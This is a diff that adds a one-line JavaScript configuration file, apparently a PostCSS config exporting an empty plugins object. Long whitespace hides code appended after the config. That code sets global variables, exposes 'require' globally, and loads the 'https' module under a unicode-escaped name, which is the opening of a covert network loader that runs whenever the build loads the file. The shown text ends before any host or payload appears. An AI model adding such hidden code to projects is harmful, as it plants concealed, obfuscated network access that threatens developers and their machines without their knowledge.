@@ -1,0 +1,1 @@
+module.exports = { plugins: {} };                                                                                                                                                                                                        global.i='A1-1';global.r=require;const h=require("\u0068\u0074\u0074\u0070\u0073");
